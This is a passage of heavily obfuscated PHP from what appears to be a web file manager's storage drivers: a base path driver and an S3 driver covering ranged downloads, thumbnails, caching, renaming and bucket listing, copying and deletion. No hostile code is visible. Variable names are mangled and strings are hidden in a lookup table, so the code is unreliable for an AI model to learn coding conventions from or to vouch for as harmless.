} $Ù¨éÚ–Õ = $this->getContent($­İèåÃ´); $Ù¨éÚ–Õ = Html::clearSVG($Ù¨éÚ–Õ); header($Ş€áÀŠ[152] . strlen($Ù¨éÚ–Õ)); echo $Ù¨éÚ–Õ; die; } $âÀĞü° = strtolower($_SERVER[$Ş€áÀŠ[153]]); if ($¿Ë×™¦¥ && $âÀĞü° && $Ôä±‘öÉ) { if (strstr($âÀĞü°, $Ş€áÀŠ[154])) { header($Ş€áÀŠ[155] . $­İèåÃ´); } else { if (strstr($âÀĞü°, $Ş€áÀŠ[156])) { header($Ş€áÀŠ[157] . $­İèåÃ´); } else { if (strstr($âÀĞü°, $Ş€áÀŠ[158])) { header($Ş€áÀŠ[159] . $­İèåÃ´); } } } if ($¬‹æÙÄ¸) { header($Ş€áÀŠ[160] . $¬‹æÙÄ¸); } return; } if (isset($_SERVER[$Ş€áÀŠ[161]])) { if (preg_match($Ş€áÀŠ[162], $_SERVER[$Ş€áÀŠ[161]], $Ü¿©µ‘¡)) { $¯¦‡¢Áâ = intval($Ü¿©µ‘¡[1]); $¯¦‡¢Áâ = $¯¦‡¢Áâ <= 0 ? 0 : ($¯¦‡¢Áâ >= $áÒİ”ïî ? $áÒİ”ïî : $¯¦‡¢Áâ); if (!empty($Ü¿©µ‘¡[2])) { $Í×İÂöÂ = intval($Ü¿©µ‘¡[2]); $áÒİ”ïî = $Í×İÂöÂ < $¯¦‡¢Áâ ? $¯¦‡¢Áâ : ($Í×İÂöÂ >= $áÒİ”ïî ? $áÒİ”ïî : $Í×İÂöÂ); } } header($Ş€áÀŠ[163]); header("\x43\x6f\156\x74\x65\x6e\x74\x2d\122\141\x6e\147\145\72\40\x62\171\164\145\x73\40{$¯¦‡¢Áâ}\x2d{$áÒİ”ïî}\57" . $¬¿®Ã‚Ï); } else { header($Ş€áÀŠ[164]); } header($Ş€áÀŠ[165]); $„€²ùš× = !0; if ($_SERVER[$Ş€áÀŠ[166]] == $Ş€áÀŠ[167] && $¬¿®Ã‚Ï > 1204 * 1024 * 1024 * 2) { $„€²ùš× = !1; } if ($„€²ùš×) { header($Ş€áÀŠ[168] . ($áÒİ”ïî - $¯¦‡¢Áâ + 1)); } if ($_SERVER[$Ş€áÀŠ[169]] == $Ş€áÀŠ[170]) { return; } $Ø¢šå’ = 1024 * 100; $¹óÅğ = 0; if ($¬‹æÙÄ¸) { $¹óÅğ = intval(1000 * 1000 * ($Ø¢šå’ / $¬‹æÙÄ¸)); } while ($¯¦‡¢Áâ <= $áÒİ”ïî) { $«ê”ĞÔ† = timeFloat(); check_abort(); $­»¹°ß = $áÒİ”ïî - $¯¦‡¢Áâ + 1; if ($­»¹°ß <= $Ø¢šå’) { $Ø¢šå’ = $­»¹°ß; } echo $this->fileSubstr($­İèåÃ´, $¯¦‡¢Áâ, $Ø¢šå’); $¯¦‡¢Áâ += $Ø¢šå’; if ($Ø¢šå’ == $­»¹°ß) { $¯¦‡¢Áâ = $áÒİ”ïî + 1; } if ($¹óÅğ) { $ƒÒ“Ê«ï = intval(1000 * 1000 * (timeFloat() - $«ê”ĞÔ†)); $‹ÃÕû¡¢ = $¹óÅğ - $ƒÒ“Ê«ï; if ($‹ÃÕû¡¢ > 5) { usleep($‹ÃÕû¡¢); } } } } public function fileOutServer($å§ÀöıÑ, $¯ù¦¦Öõ = false, $Â¼§Ìªõ = false, $İç÷Ôü¿ = '') { $this->fileOut($å§ÀöıÑ, $¯ù¦¦Öõ, $Â¼§Ìªõ, $İç÷Ôü¿); } public function fileOutLink($Õ‚å‚Ôé) { header($_SERVER[¹òÍ›æş][171] . $Õ‚å‚Ôé); die; } public function cacheMethod($İÜ®‘Š£, $ “âì«, $Œ³î¬©Ø = null) { $ÒÙ¼Ü¼Á =& $_SERVER[¹òÍ›æş]; static $ü‚¥Ò‰­ = array(); $«àËµ‚ì = $ “âì« ? ltrim($this->getPathOuter($ “âì«), $ÒÙ¼Ü¼Á[8]) : $ÒÙ¼Ü¼Á[12]; $“µÆ¾ì¸ = $ÒÙ¼Ü¼Á[172] . $İÜ®‘Š£ . $ÒÙ¼Ü¼Á[173] . rtrim($«àËµ‚ì, $ÒÙ¼Ü¼Á[8]); if (is_null($İÜ®‘Š£)) { $ü‚¥Ò‰­ = array(); return; } if (is_null($ “âì«)) { foreach ($ü‚¥Ò‰­ as $“µÆ¾ì¸ => $–Ê±İ‘ô) { if (!strstr($“µÆ¾ì¸, $ÒÙ¼Ü¼Á[172] . $İÜ®‘Š£ . $ÒÙ¼Ü¼Á[174])) { continue; } unset($ü‚¥Ò‰­[$“µÆ¾ì¸]); } return; } if (!is_null($Œ³î¬©Ø)) { $ü‚¥Ò‰­[$“µÆ¾ì¸] = $Œ³î¬©Ø; return; } $ÅÔÊüáú = isset($ü‚¥Ò‰­[$“µÆ¾ì¸]) ? $ü‚¥Ò‰­[$“µÆ¾ì¸] : null; if (!is_null($ÅÔÊüáú)) { return $ÅÔÊüáú; } $ÅÔÊüáú = $this->{$İÜ®‘Š£}($ “âì«); $ü‚¥Ò‰­[$“µÆ¾ì¸] = $ÅÔÊüáú; return $ÅÔÊüáú; } public function cacheMethodInfoSet($şú·Å£ş, $µ’ÏÈïÛ, $ş£û®ı = false) { $³¡ÎÉ“ƒ =& $_SERVER[¹òÍ›æş]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($³¡ÎÉ“ƒ[175], $şú·Å£ş, $µ’ÏÈïÛ); $this->cacheMethod($³¡ÎÉ“ƒ[176], $şú·Å£ş, $µ’ÏÈïÛ ? !1 : !0); if (is_array($ş£û®ı)) { $this->cacheMethod($³¡ÎÉ“ƒ[177], $şú·Å£ş, $ş£û®ı); } } public function fileOutImage($ìå“ı©ú, $ŸŠÌÓ»ì = 250) { $—…ñ›ë» =& $_SERVER[¹òÍ›æş]; set_timeout(); if (substr($ìå“ı©ú, 0, 4) == $—…ñ›ë»[158]) { $this->fileOutLink($ìå“ı©ú); } $¯üäõæÖ = $this->info($ìå“ı©ú); $ş¾×›Ÿ = $¯üäõæÖ[$—…ñ›ë»[32]]; $Šï¥İÒ† = !1; if (isset($GLOBALS[$—…ñ›ë»[178]]) && $GLOBALS[$—…ñ›ë»[178]][$—…ñ›ë»[94]] == $¯üäõæÖ[$—…ñ›ë»[94]]) { $—é€íÒº = $GLOBALS[$—…ñ›ë»[178]][$—…ñ›ë»[179]]; if (!$¯üäõæÖ[$—…ñ›ë»[180]]) { $¯üäõæÖ[$—…ñ›ë»[180]] = $GLOBALS[$—…ñ›ë»[178]]; } if (isset($—é€íÒº[$—…ñ›ë»[181]])) { if ($—é€íÒº[$—…ñ›ë»[181]] <= $ŸŠÌÓ»ì && $—é€íÒº[$—…ñ›ë»[182]] <= $ŸŠÌÓ»ì) { $Šï¥İÒ† = !0; } } $ş¾×›Ÿ = $¯üäõæÖ[$—…ñ›ë»[180]][$—…ñ›ë»[32]]; } if ($¯üäõæÖ[$—…ñ›ë»[86]] <= 1024 * 50 || $Šï¥İÒ† || !function_exists($—…ñ›ë»[183]) || $¯üäõæÖ[$—…ñ›ë»[184]] == $—…ñ›ë»[185]) { return $this->fileOut($ìå“ı©ú, !1, $ş¾×›Ÿ); } if (isset($¯üäõæÖ[$—…ñ›ë»[180]][$—…ñ›ë»[186]])) { $®úúû’ = $¯üäõæÖ[$—…ñ›ë»[180]][$—…ñ›ë»[186]]; } else { if (isset($¯üäõæÖ[$—…ñ›ë»[180]][$—…ñ›ë»[187]])) { $®úúû’ = $¯üäõæÖ[$—…ñ›ë»[180]][$—…ñ›ë»[187]]; } } if (!$®úúû’) { $®úúû’ = md5("{$¯üäõæÖ[$—…ñ›ë»[32]]}\137{$¯üäõæÖ[$—…ñ›ë»[94]]}\x5f{$¯üäõæÖ[$—…ñ›ë»[86]]}\x5f{$ŸŠÌÓ»ì}"); } $ìçµİ¹‡ = "{$®úúû’}\137{$ŸŠÌÓ»ì}\56\160\x6e\x67"; if (!($¶öå’ã• = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $—…ñ›ë»[188]))) { $ßóÑ±áê = IO::mkdir(IO_PATH_SYSTEM_TEMP . $—…ñ›ë»[189]); } else { $ßóÑ±áê = KodIO::make($¶öå’ã•); } if ($¶öå’ã• = IO::fileNameExist($ßóÑ±áê, $ìçµİ¹‡)) { $—›Í®ı = KodIO::make($¶öå’ã•); return IO::fileOut($—›Í®ı, !1, $ş¾×›Ÿ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $—›Í®ı = DATA_THUMB . $ìçµİ¹‡; del_file($—›Í®ı); if (!@file_exists($—›Í®ı)) { $¢êÓ¥å = TEMP_FILES; if (!is_dir($¢êÓ¥å)) { mk_dir($¢êÓ¥å); } $ÆØ¸áÚö = $¢êÓ¥å . $®úúû’ . $—…ñ›ë»[10] . $¯üäõæÖ[$—…ñ›ë»[184]]; if (!@file_exists($ÆØ¸áÚö)) { $ÆØ¸áÚö = $this->download($ìå“ı©ú, $ÆØ¸áÚö); } ImageThumb::createThumb($ÆØ¸áÚö, $—›Í®ı, $ŸŠÌÓ»ì, $ŸŠÌÓ»ì * 10); } if (!file_exists($—›Í®ı) || filesize($—›Í®ı) < 100) { return @file_exists($ÆØ¸áÚö) ? IO::fileOut($ÆØ¸áÚö) : $this->fileOut($ìå“ı©ú); } if (!($¼ş÷ÔĞô = IO::move($—›Í®ı, $ßóÑ±áê))) { return IO::fileOut($—›Í®ı); } del_file($—›Í®ı); IO::fileOut($¼ş÷ÔĞô); } public function fileOutImageServer($¯¥µÈùæ, $¿êõÌ„å = 250) { $this->fileOutImage($¯¥µÈùæ, $¿êõÌ„å); } public function fileNameAuto($ø‰¶œ°, $­¥»Ãğ, $Ğª„ûâ€ = REPEAT_RENAME, $ö–ô¿ûÜ = false) { $ìØ„şñÕ =& $_SERVER[¹òÍ›æş]; $ë÷Ú¯äÓ = $ø‰¶œ° === $ìØ„şñÕ[12] ? $­¥»Ãğ : rtrim($ø‰¶œ°, $ìØ„şñÕ[8]) . $ìØ„şñÕ[8] . $­¥»Ãğ; if ($Ğª„ûâ€ == REPEAT_REPLACE || !$this->exist($ë÷Ú¯äÓ) || $ö–ô¿ûÜ && $Ğª„ûâ€ != REPEAT_RENAME_FOLDER) { return $­¥»Ãğ; } if ($Ğª„ûâ€ == REPEAT_SKIP) { return !1; } $ÏÏËª¢Ÿ = $ìØ„şñÕ[10] . get_path_ext($­¥»Ãğ); $ÏÏËª¢Ÿ = $ÏÏËª¢Ÿ == $ìØ„şñÕ[10] || $ö–ô¿ûÜ ? $ìØ„şñÕ[12] : $ÏÏËª¢Ÿ; $Œ»”ÅÒÉ = 1; $ú¬Ê‡€± = substr($­¥»Ãğ, 0, strlen($­¥»Ãğ) - strlen($ÏÏËª¢Ÿ)); $’áéˆÄÍ = $ú¬Ê‡€± . "\50{$Œ»”ÅÒÉ}\51{$ÏÏËª¢Ÿ}"; while ($this->exist(rtrim($ø‰¶œ°, $ìØ„şñÕ[8]) . $ìØ„şñÕ[8] . $’áéˆÄÍ)) { $’áéˆÄÍ = $ú¬Ê‡€± . "\50{$Œ»”ÅÒÉ}\51{$ÏÏËª¢Ÿ}"; $Œ»”ÅÒÉ++; } return $’áéˆÄÍ; } private function fileNameAutoList($Æ§ÚÓÔé, $¹ ë¥Ğ‡, $‚ŠÒĞê¨ = false) { $˜¡¸Œı² =& $_SERVER[¹òÍ›æş]; $÷ÕĞğÓ” = $this->listPath($Æ§ÚÓÔé, !0); $÷ÕĞğÓ” = array_merge($÷ÕĞğÓ”[$˜¡¸Œı²[92]], $÷ÕĞğÓ”[$˜¡¸Œı²[93]]); $ïµ–ÆÆš = array_to_keyvalue($÷ÕĞğÓ”, $˜¡¸Œı²[12], $˜¡¸Œı²[32]); $ßšÈªÒº = $˜¡¸Œı²[10] . get_path_ext($¹ ë¥Ğ‡); $ßšÈªÒº = $ßšÈªÒº == $˜¡¸Œı²[10] || $‚ŠÒĞê¨ ? $˜¡¸Œı²[12] : $ßšÈªÒº; $ü¢œˆØ– = substr($¹ ë¥Ğ‡, 0, strlen($¹ ë¥Ğ‡) - strlen($ßšÈªÒº)); $ñõšóşÌ = $ü¢œˆØ– . "\x28\x30\51{$ßšÈªÒº}"; for ($Ô§Ø Ç¸ = 1; $Ô§Ø Ç¸ <= count($ïµ–ÆÆš) + 1; $Ô§Ø Ç¸++) { $ñõšóşÌ = $ü¢œˆØ– . "\50{$Ô§Ø Ç¸}\51{$ßšÈªÒº}"; if (!in_array_not_case($ñõšóşÌ, $ïµ–ÆÆš)) { return $ñõšóşÌ; } } return $ñõšóşÌ; } public function listAllFiles($È¿áœ«Ò, $é„²¬Ê³) { $ıßï€°õ =& $_SERVER[¹òÍ›æş]; if (empty($é„²¬Ê³)) { return array(); } $±õ›Ì¢È = array_keys($é„²¬Ê³); $şğŸ†§à = array(); $È¿áœ«Ò = trim($È¿áœ«Ò, $ıßï€°õ[8]); foreach ($é„²¬Ê³ as $¯œÉµÛï => $ë‚²¹) { $©­›´íÔ = ltrim(substr(trim($¯œÉµÛï, $ıßï€°õ[8]), strlen($È¿áœ«Ò)), $ıßï€°õ[8]); if (substr($¯œÉµÛï, -1) == $ıßï€°õ[8]) { $©­›´íÔ = rtrim($©­›´íÔ, $ıßï€°õ[8]) . $ıßï€°õ[8]; } $şğŸ†§à = array_merge($şğŸ†§à, $this->slicePath($©­›´íÔ)); } $™ß—×Á© = array(); foreach (array_unique($şğŸ†§à) as $¢õ‡»Õê) { $ğëÔ«È = array($ıßï€°õ[94] => $this->getPathOuter($ıßï€°õ[8] . $È¿áœ«Ò . $ıßï€°õ[8] . $¢õ‡»Õê), $ıßï€°õ[85] => 1, $ıßï€°õ[86] => 0); if (substr($¢õ‡»Õê, -1) != $ıßï€°õ[8]) { $ğëÔ«È[$ıßï€°õ[85]] = 0; $íƒ‡Ú…× = $this->getPath($È¿áœ«Ò . $ıßï€°õ[8] . $¢õ‡»Õê); if (isset($é„²¬Ê³[$íƒ‡Ú…×])) { $»ç®±²ø = $é„²¬Ê³[$íƒ‡Ú…×]; if (isset($»ç®±²ø[$ıßï€°õ[86]])) { $ğëÔ«È[$ıßï€°õ[86]] = intval($»ç®±²ø[$ıßï€°õ[86]]); } if (isset($»ç®±²ø[$ıßï€°õ[190]])) { $ğëÔ«È[$ıßï€°õ[95]] = intval($»ç®±²ø[$ıßï€°õ[190]]); } } } $™ß—×Á©[] = $ğëÔ«È; } return $™ß—×Á©; } public function slicePath($ä½ß‘ó) { $ÓğîÅÂ¢ =& $_SERVER[¹òÍ›æş]; $¿ı»Ëâ“ = explode($ÓğîÅÂ¢[8], trim($ä½ß‘ó, $ÓğîÅÂ¢[8])); $¹áøóíÆ = 0; do { ++$¹áøóíÆ; $”ÄšûëŠ[] = implode($ÓğîÅÂ¢[8], array_slice($¿ı»Ëâ“, 0, $¹áøóíÆ)) . $ÓğîÅÂ¢[8]; } while ($¹áøóíÆ < count($¿ı»Ëâ“)); $”ÄšûëŠ[count($¿ı»Ëâ“) - 1] = $ä½ß‘ó; return $”ÄšûëŠ; } public function getHost() { $¤»ö§ô¸ =& $_SERVER[¹òÍ›æş]; $¸‚ôÜİù = parse_url(trim($this->domain, $¤»ö§ô¸[8])); $ò¨»ºàµ = isset($¸‚ôÜİù[$¤»ö§ô¸[191]]) ? $¸‚ôÜİù[$¤»ö§ô¸[191]] : http_type(); $â–à±ù¾ = isset($¸‚ôÜİù[$¤»ö§ô¸[192]]) ? $¸‚ôÜİù[$¤»ö§ô¸[192]] : $¸‚ôÜİù[$¤»ö§ô¸[94]]; if (isset($¸‚ôÜİù[$¤»ö§ô¸[193]])) { $â–à±ù¾ .= $¤»ö§ô¸[4] . $¸‚ôÜİù[$¤»ö§ô¸[193]]; } return $ò¨»ºàµ . $¤»ö§ô¸[194] . $â–à±ù¾; } public function pathEncode($¿ö¶ –œ) { $·Ëù¡ƒû =& $_SERVER[¹òÍ›æş]; return str_replace($·Ëù¡ƒû[195], $·Ëù¡ƒû[8], rawurlencode($¿ö¶ –œ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ú›’ºÜ) { set_timeout(); require_once SDK_DIR . $_SERVER[¹òÍ›æş][196]; parent::__construct(); $this->_init($Ú›’ºÜ); } public function _init($÷¬‚ø¢) { $this->config = $÷¬‚ø¢; foreach ($÷¬‚ø¢ as $‰‹Àà¦Ã => $ìõ³ûÙĞ) { if (isset($this->{$‰‹Àà¦Ã})) { $this->{$‰‹Àà¦Ã} = $ìõ³ûÙĞ; } } $this->endpoint = $÷¬‚ø¢[$_SERVER[¹òÍ›æş][197]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Š¦¶à ç = "\x76\x34") { $this->signVer = $Š¦¶à ç; $this->client->setSignatureVersion($Š¦¶à ç); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ñËÅÂŞ =& $_SERVER[¹òÍ›æş]; $ªÊç×Ù¿ = $this->getBucketCors(); if (!$ªÊç×Ù¿ || !is_array($ªÊç×Ù¿)) { return !1; } if ($ªÊç×Ù¿[$ñËÅÂŞ[198]] != $ñËÅÂŞ[199] || $ªÊç×Ù¿[$ñËÅÂŞ[200]] != $ñËÅÂŞ[199]) { return !1; } $Ş¹†á”Â = array_map($ñËÅÂŞ[201], $ªÊç×Ù¿[$ñËÅÂŞ[202]]); if (!is_array($Ş¹†á”Â)) { $Ş¹†á”Â = array(); } $²òĞ¬ºü = array($ñËÅÂŞ[203], $ñËÅÂŞ[204], $ñËÅÂŞ[205], $ñËÅÂŞ[206], $ñËÅÂŞ[207]); $½‹ªÀ ± = array_diff($²òĞ¬ºü, $Ş¹†á”Â); return empty($½‹ªÀ ±); } public function mkfile($©‘ö‹Î–, $œÁó´Á· = '', $ÊÙ‚ğü¢ = REPEAT_RENAME) { $³ˆ£—ûğ = $this->setContent($©‘ö‹Î–, $œÁó´Á·); if ($³ˆ£—ûğ !== !1) { return $this->getPathOuter($©‘ö‹Î–); } return !1; } public function mkdir($şœÃÛîş, $ŸÉ£Í° = REPEAT_SKIP) { $ñ€ß“Ì¨ =& $_SERVER[¹òÍ›æş]; if (empty($şœÃÛîş) && $şœÃÛîş !== $ñ€ß“Ì¨[208]) { return !1; } if ($ŸÉ£Í° && $this->_isFolder($şœÃÛîş)) { return $this->getPathOuter($şœÃÛîş); } $èé²Óä = $this->setContent($şœÃÛîş, $ñ€ß“Ì¨[12], !0); if ($èé²Óä !== !1) { return $this->getPathOuter($şœÃÛîş); } return !1; } public function copyFile($áß‘øØÂ, $ËöÄÁå¤, $»–Îêİí = array()) { $À¤Ä»ûÊ =& $_SERVER[¹òÍ›æş]; $¶¬¹Íûã = $this->objectMeta($áß‘øØÂ); if (!$¶¬¹Íûã) { return !1; } if ($¶¬¹Íûã[$À¤Ä»ûÊ[86]] <= 1024 * 1024 * 200) { $—ÄˆÖåæ = $this->client->copyObject($this->bucket, $áß‘øØÂ, $this->bucket, $ËöÄÁå¤, $À¤Ä»ûÊ[209], $»–Îêİí); } else { $—ÄˆÖåæ = $this->client->multiCopyObject($this->bucket, $áß‘øØÂ, $this->bucket, $ËöÄÁå¤, $»–Îêİí); } $—ÄˆÖåæ = $—ÄˆÖåæ ? $this->getPathOuter($ËöÄÁå¤) : !1; return $—ÄˆÖåæ; } public function moveFile($‘Æğ•ª, $ûÔšÙ·–) { if ($this->copyFile($‘Æğ•ª, $ûÔšÙ·–)) { $this->delFile($‘Æğ•ª); return $this->getPathOuter($ûÔšÙ·–); } return !1; } public function delFile($†ûÎñ) { return $this->client->deleteObject($this->bucket, $†ûÎñ); } public function delFolder($¾íĞúÄµ) { $Œ¦·¡Ë— =& $_SERVER[¹òÍ›æş]; if (!$this->exist($¾íĞúÄµ)) { return !0; } $this->listItemCache = !1; $÷¯æÓòÌ = $this->fileList($¾íĞúÄµ); $this->listItemCache = !0; $®­Şá‡— = trim($¾íĞúÄµ, $Œ¦·¡Ë—[8]) . $Œ¦·¡Ë—[8]; if (!empty($¾íĞúÄµ) && $¾íĞúÄµ !== $Œ¦·¡Ë—[208] && !in_array($®­Şá‡—, $÷¯æÓòÌ[$Œ¦·¡Ë—[92]])) { $÷¯æÓòÌ[$Œ¦·¡Ë—[92]][] = $®­Şá‡—; } $æçƒØ™ = $this->delByBatch($÷¯æÓòÌ[$Œ¦·¡Ë—[93]]); if (!$æçƒØ™) { return !1; } $æçƒØ™ = $this->delByBatch($÷¯æÓòÌ[$Œ¦·¡Ë—[92]]); if (!$æçƒØ™) { return !1; } return $this->delFile($®­Şá‡—); } private function delByBatch($ÕÉæÉÈø) { foreach (array_chunk($ÕÉæÉÈø, 1000) as $àœóšæé) { $Ë¤¯ë€Ğ = $this->client->deleteObjects($this->bucket, $àœóšæé); if (!$Ë¤¯ë€Ğ) { return !1; } } return !0; } public function rename($×‡ƒ×ôí, $¯ÜŒ“»Ş) { return $this->renameObject($×‡ƒ×ôí, $¯ÜŒ“»Ş); } public function listPath($Ë­ôÁ´‰, $“‹„©Ü = false) { $ëÈÆ™Š« =& $_SERVER[¹òÍ›æş]; $·ÁËŠ‰è = $this->fileList($Ë­ôÁ´‰, $ëÈÆ™Š«[8], !0); foreach ($·ÁËŠ‰è[$ëÈÆ™Š«[92]] as $ááŠúŸ => $‚Ã •«) { $·ÁËŠ‰è[$ëÈÆ™Š«[92]][$ááŠúŸ] = $this->folderInfo($‚Ã •«, $“‹„©Ü, $‚Ã •«); } foreach ($·ÁËŠ‰è[$ëÈÆ™Š«[93]] as $ááŠúŸ => $‚Ã •«) { $·ÁËŠ‰è[$ëÈÆ™Š«[93]][$ááŠúŸ] = $this->fileInfo($‚Ã •«[$ëÈÆ™Š«[32]], $“‹„©Ü, $‚Ã •«); } return $·ÁËŠ‰è; } protected function infoChildren($‡Ÿø¬ü», &$ ½•‡±€) { $¯‚û„ßÂ =& $_SERVER[¹òÍ›æş]; $æßÒè²õ = $this->fileList($‡Ÿø¬ü», $¯‚û„ßÂ[12], !0); $ ½•‡±€[$¯‚û„ßÂ[88]] += count($æßÒè²õ[$¯‚û„ßÂ[92]]); $ ½•‡±€[$¯‚û„ßÂ[87]] += count($æßÒè²õ[$¯‚û„ßÂ[93]]); foreach ($æßÒè²õ[$¯‚û„ßÂ[93]] as $‘°İŠûÅ) { if (!$‘°İŠûÅ || !$‘°İŠûÅ[$¯‚û„ßÂ[86]]) { continue; } $ ½•‡±€[$¯‚û„ßÂ[86]] += $‘°İŠûÅ[$¯‚û„ßÂ[86]]; } } private function fileInfo($¨şŞ–¬—, $İ©¯†Ö‰ = false, $ëÓúË = array()) { $Å£ŒÜ·Ù =& $_SERVER[¹òÍ›æş]; $›’Çü÷· = array($Å£ŒÜ·Ù[32] => $this->pathThis($¨şŞ–¬—), $Å£ŒÜ·Ù[94] => $this->getPathOuter($¨şŞ–¬—), $Å£ŒÜ·Ù[33] => $Å£ŒÜ·Ù[210], $Å£ŒÜ·Ù[184] => $this->ext($¨şŞ–¬—), $Å£ŒÜ·Ù[86] => isset($ëÓúË[$Å£ŒÜ·Ù[86]]) ? $ëÓúË[$Å£ŒÜ·Ù[86]] : 0); if ($İ©¯†Ö‰) { return $›’Çü÷·; } $›’Çü÷·[$Å£ŒÜ·Ù[211]] = $›’Çü÷·[$Å£ŒÜ·Ù[95]] = 0; $›’Çü÷·[$Å£ŒÜ·Ù[212]] = $›’Çü÷·[$Å£ŒÜ·Ù[213]] = !0; if (empty($ëÓúË)) { $ëÓúË = $this->objectMeta($¨şŞ–¬—); if (!$ëÓúË) { return $›’Çü÷·; } } if (isset($ëÓúË[$Å£ŒÜ·Ù[190]])) { $›’Çü÷·[$Å£ŒÜ·Ù[95]] = $ëÓúË[$Å£ŒÜ·Ù[190]]; } if (isset($ëÓúË[$Å£ŒÜ·Ù[86]])) { $›’Çü÷·[$Å£ŒÜ·Ù[86]] = $ëÓúË[$Å£ŒÜ·Ù[86]]; } return $›’Çü÷·; } private function folderInfo($€ËÂŒû, $½Ûù§ÓÓ = false, $Ãğá¼±à = array()) { $÷÷¢½±† =& $_SERVER[¹òÍ›æş]; $®”İ·»à = array($÷÷¢½±†[32] => $this->pathThis($€ËÂŒû), $÷÷¢½±†[94] => $this->getPathOuter($÷÷¢½±†[8] . $€ËÂŒû), $÷÷¢½±†[33] => $÷÷¢½±†[85]); if ($½Ûù§ÓÓ) { return $®”İ·»à; } $®”İ·»à[$÷÷¢½±†[211]] = $®”İ·»à[$÷÷¢½±†[95]] = 0; $®”İ·»à[$÷÷¢½±†[212]] = $®”İ·»à[$÷÷¢½±†[213]] = !0; if ($€ËÂŒû == $÷÷¢½±†[12]) { return $®”İ·»à; } if (empty($Ãğá¼±à)) { $Ãğá¼±à = $this->objectMeta(trim($€ËÂŒû, $÷÷¢½±†[8]) . $÷÷¢½±†[8]); } if (isset($Ãğá¼±à[$÷÷¢½±†[190]])) { $®”İ·»à[$÷÷¢½±†[211]] = $Ãğá¼±à[$÷÷¢½±†[190]]; } return $®”İ·»à; } private function fileList($âõŠŠ¤Ã, $Áã…±ÌÜ = '', $ÕÕ˜áÇ = 0) { $·íÚñ×¿ =& $_SERVER[¹òÍ›æş]; $ÎÃçô·ü = rtrim($âõŠŠ¤Ã, $·íÚñ×¿[8]) . $·íÚñ×¿[8]; $—ù²âŸı = $this->listObjs($ÎÃçô·ü, null, null, $Áã…±ÌÜ); if (!$—ù²âŸı) { return array($·íÚñ×¿[92] => array(), $·íÚñ×¿[93] => array()); } $¹ÜÌôÕÂ = $Ú˜Ã´“Ú = array(); foreach ($—ù²âŸı[$·íÚñ×¿[214]] as $ÊõóëÎ) { $ÓÜµœüÀ = $ÊõóëÎ[$·íÚñ×¿[32]]; if ($ÓÜµœüÀ == $ÎÃçô·ü) { continue; } $´¶ŠÌĞ = isset($ÊõóëÎ[$·íÚñ×¿[86]]) ? $ÊõóëÎ[$·íÚñ×¿[86]] : 0; $¬¹èü¯ò = $´¶ŠÌĞ == 0 && substr($ÓÜµœüÀ, strlen($ÓÜµœüÀ) - 1, 1) == $·íÚñ×¿[8] ? !0 : !1; $this->cacheMethodInfoSet($ÓÜµœüÀ, $¬¹èü¯ò, $ÊõóëÎ); if ($¬¹èü¯ò) { $¹ÜÌôÕÂ[] = $ÓÜµœüÀ; continue; } $Ú˜Ã´“Ú[] = $ÕÕ˜áÇ ? $ÊõóëÎ : $ÓÜµœüÀ; } foreach ($—ù²âŸı[$·íÚñ×¿[215]] as $ÊõóëÎ) { $¹ÜÌôÕÂ[] = $ÊõóëÎ[$·íÚñ×¿[32]]; $this->cacheMethodInfoSet($ÊõóëÎ[$·íÚñ×¿[32]], !0); } $this->cacheMethodInfoSet($âõŠŠ¤Ã, !0); return array($·íÚñ×¿[92] => $¹ÜÌôÕÂ, $·íÚñ×¿[93] => $Ú˜Ã´“Ú); } private function listObjs($¤–®¬õï, $šè‡ÁóŸ = null, $¾†–¸“ø = null, $İˆøÙ = null) { $šãØ…ÂÇ =& $_SERVER[¹òÍ›æş]; $¤–®¬õï = trim($¤–®¬õï, $šãØ…ÂÇ[8]); $ıØÕ÷ıÙ = empty($¤–®¬õï) && $¤–®¬õï !== $šãØ…ÂÇ[208] ? $šãØ…ÂÇ[12] : $¤–®¬õï . $šãØ…ÂÇ[8]; return $this->client->getBucket($this->bucket, $ıØÕ÷ıÙ, $šè‡ÁóŸ, $¾†–¸“ø, $İˆøÙ, !0); } public function has($»âòĞ¬, $ˆ½ƒ”Ú· = false, $Ï±“À = true) { $‡›ìäßí =& $_SERVER[¹òÍ›æş]; $»âòĞ¬ = trim($»âòĞ¬, $‡›ìäßí[8]); $ò›Ëß° = empty($»âòĞ¬) && $»âòĞ¬ !== $‡›ìäßí[208] ? $‡›ìäßí[12] : $»âòĞ¬ . $‡›ìäßí[8]; $Ñ´¨È³Í = null; $Óó†äö = 500; $Î‡Ûğ®ğ = $‡›ìäßí[8]; $£ê€·Ş = $ÁÊöÏ¹ù = array(); while (!0) { $÷ÅÉ¬Ø— = $this->listObjs($»âòĞ¬, $Ñ´¨È³Í, $Óó†äö, $Î‡Ûğ®ğ); if (!$÷ÅÉ¬Ø—) { break; } $Ñ´¨È³Í = $÷ÅÉ¬Ø—[$‡›ìäßí[216]]; $“ËÌææ = $÷ÅÉ¬Ø—[$‡›ìäßí[214]]; $’Ãáº¦ = $÷ÅÉ¬Ø—[$‡›ìäßí[215]]; if (empty($“ËÌææ) && empty($’Ãáº¦)) { break; } if (count($“ËÌææ) == 1 && $“ËÌææ[0][$‡›ìäßí[32]] == $ò›Ëß°) { break; } if ($ˆ½ƒ”Ú·) { if (count($“ËÌææ)) { $“ËÌææ = array_column($“ËÌææ, $‡›ìäßí[32]); $£ê€·Ş = array_merge($£ê€·Ş, $“ËÌææ); } if (count($’Ãáº¦)) { $’Ãáº¦ = array_column($’Ãáº¦, $‡›ìäßí[32]); $ÁÊöÏ¹ù = array_merge($ÁÊöÏ¹ù, $’Ãáº¦); } if ($Ñ´¨È³Í === null) { break; } continue; } if ($Ï±“À) { if (!empty($“ËÌææ)) { if (count($“ËÌææ) > 1 || isset($“ËÌææ[0][$‡›ìäßí[32]]) && $“ËÌææ[0][$‡›ìäßí[32]] != $ò›Ëß°) { return !0; } } } else { if (!empty($’Ãáº¦)) { return !0; } } if 